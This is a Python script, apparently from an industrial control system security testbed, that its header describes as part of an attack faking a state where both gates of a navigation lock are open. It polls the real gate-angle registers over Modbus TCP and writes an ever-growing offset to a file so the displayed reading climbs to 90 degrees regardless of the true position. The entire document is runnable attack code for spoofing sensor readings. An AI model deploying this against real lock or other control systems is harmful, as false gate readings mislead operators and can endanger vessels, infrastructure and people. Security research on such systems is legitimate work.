# this script is used in the attack that fakes a condition where both gates opening 

"""
    It takes the following args:
    python(3) lock_incrementer.py [FILE] [IP] [PORT] [GATE]

    GATE should either be "U" for the upper gate or "L" for the lower gate.

    IP and PORT refer to the address and port that the lock can be reached at.

    It will read data from the Lock and increment the file 1 raw reading every 0.01 seconds
    to make it appear that the gate is opening until it is fully open (90 deg).
"""

import sys
import time
import os
import random

from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException

class _GatesInterface:
    """
        This class offers an abstraction that allows very minimal interface with the lock gates.

        Note: This class's two methods replicate functionality in the Lock class in LockRepresentation.py in 
        the parent directory.
        
        Python resolves imports in such a way that we cannot import a file from the parent directory unless the 
        project is set up as a package, and other solutions negatively impact readability. Since this
        project is designed as a collection of scripts, rather than as an importable package, the most consistent
        way to provide this functionality was to make a (greatly) simplified class exclusively for this purpose.
    """

    def __init__(self, ip, port):
        self.client = ModbusTcpClient(ip, port)
        self.upper_cache = 700
        self.lower_cache = 700

    def get_upper_gate_value(self):
        new = self.client.read_input_registers(2)
        if type(new) != ModbusIOException:
            self.upper_cache = int(new.getRegister(0))
        return self.upper_cache
    
    def get_lower_gate_value(self):
        new = self.client.read_input_registers(3)
        if type(new) != ModbusIOException:
            self.lower_cache = int(new.getRegister(0))
        return self.lower_cache

def setup():
    fileName = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3])
    gate = sys.argv[4]
    assert (gate == "U" or gate == "L"), "Specified gate does not exist. Use either 'U' or 'L'."

    return gate, fileName, ip, port

def main():
    increment = 0

    # 90 degrees * 100 counts per value
    gate_max = 9000

    gate, fileName, ip, port = setup()
    
    gate_iface = _GatesInterface(ip, port)

    try:
        while True:

            # determine the real and displayed current value
            if gate == "U":
                real_val = gate_iface.get_upper_gate_value()
            elif gate == "L":
                real_val = gate_iface.get_lower_gate_value()

            disp_val = real_val + increment

            if disp_val > gate_max:
                # if it's displaying that we're more than fully open, make it seem 
                # like we are fully open
                increment = gate_max - real_val
            elif disp_val == gate_max:
                pass # if we're fully open, idle
            elif disp_val < gate_max:
                # if less than fully open add a varying amount
                increment += random.randint(1, 30)

            # write to the file
            with open(fileName, "w") as f:
                f.write(str(increment))
                
            time.sleep(0.01)

    finally:
        os.remove(fileName)

if __name__ == "__main__":
    main()